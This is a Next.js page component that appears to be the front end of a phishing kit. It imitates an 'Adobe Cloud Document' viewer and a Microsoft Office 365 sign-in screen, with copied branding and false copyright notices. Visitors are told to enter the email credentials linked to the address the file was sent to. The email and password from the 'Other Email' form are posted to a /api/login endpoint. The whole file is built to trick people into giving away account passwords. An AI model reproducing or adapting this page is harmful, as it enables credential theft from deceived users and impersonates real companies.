import Head from "next/head";
import Image from "next/image";
import { Inter } from "next/font/google";
import styles from "@/styles/Home.module.css";
import Link from "next/link";
import { TfiMicrosoftAlt } from "react-icons/tfi";
import { MdAlternateEmail } from "react-icons/md";
import { useState } from "react";

const inter = Inter({ subsets: ["latin"] });

const currentYear = new Date().getFullYear();

export default function Home() {

  const [show, setShow] = useState(false);
  const [office, setOffice] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, password }),
    });

    const data = await response.json();
    console.log(data.message);
  };

  const handleShow = () => {
    setShow(true);
    setOffice(false);
  }
  const handleShowBack = () => {
    setShow(false);
    setOffice(false);
  }
  const handleOffice = () => {
    setOffice(true);
    setShow(true);
  }
  return (
    <>
      <Head>
        <title>Microsoft Office Sign In Page</title>
        <meta name="description" content="Generated by create next app" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <main className={`${styles.main} ${inter.className}`}>
      {!show && !office && <div className={styles.box}>
          <div className="d-flex justify-content-center"><Image src='/adobe.jpg' alt="adobe" width={100} height={100}/> </div>
          <div className="text-center py-2">
          <h6 className={styles.adobeHeader}>Adobe Cloud Document</h6>
          <p className={styles.adobeText}>To access the document, please log in using the email credentials associated with the email address to which this file was sent.</p>
          </div>
          <div>
            <Link href="/#" className={styles.emailLinks} onClick={handleOffice}>
            <div className={styles.officeBox}><TfiMicrosoftAlt className={styles.officeIcon}/></div>
            <h6 className={styles.signin}>Sign in with Office365</h6>
            
            </Link>
            <Link href="/#" className={styles.emailLink}  onClick={handleShow}>
            <div className={styles.otherBox}><MdAlternateEmail className={styles.otherIcon}/></div>
           <h6 className={styles.signin}>Sign in with Other Email</h6> 
            </Link>
          </div>
          <div>
            <small className={styles.copyright}>Select your email provider to view Document.</small>
            <small className={styles.copyright}>&copy; {currentYear} Adobe System Incorporated, All right reserved.</small>
          </div>
        </div>}
        {show && !office && <div className={styles.box}>
        <div className="d-flex justify-content-center"><Image src='/otheremail.png' alt="adobe" width={70} height={70} className={styles.emailimg}/> </div>
          <div className="text-center py-2">
          <h6 className={styles.adobeHeader}> Login with Other Email</h6>
            <form onSubmit={handleSubmit}>
            <div className={styles.modalsubtext}>
                           <label className={styles.label}>Email Address</label>
                           <div className={styles.forgotInputContainer}>
                             <input
                              //  type= "text" 
                               placeholder="Email Address"
                               name="email"
                               type="email"
                                id="email"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                required
                              //  value={keywords.title}
                              //  onChange={handleChange}
                               className={`${styles.passwordinput} form-contol`}
                             />
                             <label className={styles.labels}>We&lsquo;ll never share your email with anyone else.</label>
                            
                           </div>
                         </div>
                         <div className={styles.modalsubtext}>
                           <label className={styles.label}>Password</label>
                           <div className={styles.forgotInputContainer}>
                             <input
                               type= "password" 
                               placeholder="********"
                                id="password"
                               name="password"
                              value={password}
                              onChange={(e) => setPassword(e.target.value)}
                              required

                               className={`${styles.passwordinput} form-contol`}
                             />
                            
                           </div>
                         </div>
                         <div className={styles.btncontainer}>
                          <button className={styles.closebtn} onClick={handleShowBack}>Back</button>
                          <button className={styles.loginbtn} type="submit">Login</button>
                         </div>
            </form>
            <div className="pt-4">
            <small className={styles.copyright}>&copy; {currentYear} Adobe System Incorporated, All right reserved.</small>
            </div>
          </div>
          </div>}
        {office && show &&
        <div className={styles.box}>
        <div className="d-flex justify-content-start align-items-center"><Image src='/office.png' alt="adobe" width={30} height={30} className={styles.emalimg}/> <h6 className={styles.office}>Microsoft</h6> </div>
        <div className="pt-4">
          <h6 className={styles.sign}>Sign in</h6>
          <p className={styles.account}>to access your Microsoft Office 365 account</p>
        </div>
          <div className="text-center py-2">
          {/* <h6 className={styles.adobeHeader}> Login with Other Email</h6> */}
            <form>
            <div className={styles.modalsubtext}>
                           <label className={styles.label}>Email Address</label>
                           <div className={styles.forgotInputContainer}>
                             <input
                               type= "text" 
                               placeholder="Email"
                               name="password"
                              //  value={keywords.title}
                              //  onChange={handleChange}
                               className={`${styles.officeInput} form-contol`}
                             />
                             {/* <label className={styles.labels}>We&lsquo;ll never share your email with anyone else.</label> */}
                            
                           </div>
                         </div>
                         <div className={styles.modalsubtext}>
                           <label className={styles.label}>Password</label>
                           <div className={styles.forgotInputContainer}>
                             <input
                               type= "text" 
                               placeholder="********"
                               name="password"
                              //  value={keywords.title}
                              //  onChange={handleChange}
                               className={`${styles.officeInput} form-contol`}
                             />
                            
                           </div>
                         </div>
                         <div className={styles.btncontainer}>
                         <button className={styles.closebtn} onClick={handleShowBack}>Back</button>
                          <button className={styles.loginbtn}>Sign in</button>
                         </div>
            </form>
            <div className="pt-4">
            <small className={styles.copyright}>&copy; {currentYear} Microsoft Office 365, All right reserved.</small>
            </div>
          </div>
          </div>
          } 
      </main>
    </>
  );
}
